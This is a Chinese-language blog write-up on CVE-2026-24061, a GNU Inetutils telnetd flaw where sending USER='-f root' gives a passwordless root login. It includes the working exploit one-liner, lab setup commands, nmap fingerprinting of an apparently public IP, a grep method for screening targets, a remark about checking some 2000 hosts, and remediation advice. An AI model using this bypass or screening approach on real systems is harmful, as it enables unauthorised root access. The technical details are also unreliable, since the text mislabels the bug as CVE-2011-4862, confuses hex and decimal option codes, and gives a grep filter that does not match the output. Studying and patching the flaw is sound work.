# 复现cve-2026-24061

## 漏洞概述

GNU Inetutils 的 telnetd 服务在处理环境变量时存在缺陷。当客户端通过 `USER` 环境变量传递 `-f root` 时，`telnetd` 会将其传递给 `/bin/login` 程序。`login` 程序的 `-f` 参数用于强制登录指定用户（通常用于预认证环境），从而导致攻击者无需密码即可登录为 root 用户。

受影响系统: Debian, Ubuntu, Kali 等默认包含该组件的 Linux 发行版。

| **发行版**    | **默认提供的软件包实现** | **状态**   |
| ------------- | ------------------------ | ---------- |
| Debian 12     | GNU inetutils-telnetd    | **受影响** |
| Debian 13     | GNU inetutils-telnetd    | **受影响** |
| Ubuntu 24.04+ | GNU inetutils-telnetd    | **受影响** |
| Kali Linux    | GNU inetutils-telnetd    | **受影响** |

## 漏洞复现

拉一个环境配置telnet服务，打开23端口

![image-20260123110536873](/posts/cve-2026-24061/image-20260123110536873.png)

添加用户

![image-20260123111036264](/posts/cve-2026-24061/image-20260123111036264.png)

启动服务

```
echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd" > /etc/inetd.conf

/usr/sbin/inetutils-inetd

容器外
netstat -antp | grep 23
```

![image-20260123111422496](/posts/cve-2026-24061/image-20260123111422496.png)

测试

```
telnet 127.0.0.1 2323

USER='-f root' telnet -a 127.0.0.1 2323

```

成功复现

![image-20260123111815480](/posts/cve-2026-24061/image-20260123111815480.png)

## 漏洞原理

- `USER='-f root'：我们在本地设置环境变量 ``USER` 的值为 `-f root`。
- `telnet -a`：告诉 telnet 客户端尝试自动登录，这会将本地的 `USER` 环境变量发送给服务端。
- **服务端逻辑错误**：`inetutils-telnetd` 接收到这个环境变量后，直接将其传递给了 `/bin/login` 程序。最终执行的命令变成了类似 `login -f root`。
- **结果**：`login` 程序认为用户已经通过认证，直接放行

## 指纹识别

存在漏洞的指纹检测

```
┌──(root㉿kali)-[/home/kali]

└─# nmap -p 2323 --script banner,telnet-encryption,telnet-ntlm-info 127.0.0.1

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-22 22:33 EST

Nmap scan report for localhost (127.0.0.1)

Host is up (0.00013s latency).



PORT     STATE SERVICE

2323/tcp open  3d-nfsd

| banner: \xFF\xFB%\xFF\xFB&\xFF\xFD\x18\xFF\xFD \xFF\xFD#\xFF\xFD'\xFF\x

|_FD$



Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
```

不存在的指纹检测

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -p 23 --script banner,telnet-encryption,telnet-ntlm-info 171.213.199.151 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-22 22:37 EST
Nmap scan report for 171.213.199.151
Host is up (0.00068s latency).

PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 4.36 seconds

```

指纹识别主要看是否支持环境变量，要触发 **CVE-2011-4862**（即你通过 `USER='-f root'` 实现的绕过），服务端必须发送或接受以下两个关键选项之一：

1. **`27` (New Environment)**：十六进制为 `\x1B`（在指令中表现为 `ff fd 27` 或 `ff fb 27`）。

2. **`24` (Environment)**：十六进制为 `\x18`（在指令中表现为 `ff fd 24` 或 `ff fb 24`）。

   | **十六进制**   | **Nmap 显示内容** | **协议指令 (RFC 854)** | **选项含义 (Options)**                            |
   | -------------- | ----------------- | ---------------------- | ------------------------------------------------- |
   | `ff fb 25`     | `\xFF\xFB%`       | IAC WILL **37**        | Authentication (37 的十六进制是 25，字符是 `%`)   |
   | `ff fb 26`     | `\xFF\xFB&`       | IAC WILL **38**        | Encryption (38 的十六进制是 26，字符是 `&`)       |
   | `ff fd 18`     | `\xFF\xFD\x18`    | IAC DO **24**          | Terminal Type (不可打印，保持十六进制)            |
   | `ff fd 20`     | `\xFF\xFD `       | IAC DO **32**          | Terminal Speed (32 十六进制是 20，字符是**空格**) |
   | `ff fd 23`     | `\xFF\xFD#`       | IAC DO **35**          | X Display Location (35 十六进制是 23，字符是 `#`) |
   | **`ff fd 27`** | **`\xFF\xFD'`**   | **IAC DO 39**          | **New Environment (核心漏洞特征，27 = `'`)**      |
   | **`ff fd 24`** | **`\xFF\xFD$`**   | **IAC DO 36**          | **Environment (核心漏洞特征，24 = `$`)**          |

如果想通过 Nmap 快速筛选潜在漏洞目标，可以利用 `grep` 过滤这把“钥匙”：

   ```
   # 在扫描结果中查找 27 (New Environment) 的十六进制指纹
   nmap -p 23 --script banner <IP> | grep -E "27|24"
   ```

这个漏洞范围面比较少，我找了2000来个都没发现.......，遇到了一句话测一测就行

## 修复建议

1. **首选方案**：**彻底关闭 Telnet 服务**，迁移至 SSH。Telnet 明文传输在现代网络环境中本身就是巨大的安全隐患。

2. **临时方案**：升级 `inetutils` 包至最新修复版本，或使用不包含此漏洞的 `telnetd` 实现（如 `netkit-telnetd`）。

3. **升级修复**：通过包管理器将GNU Inetutils升级为2.7以上版本

   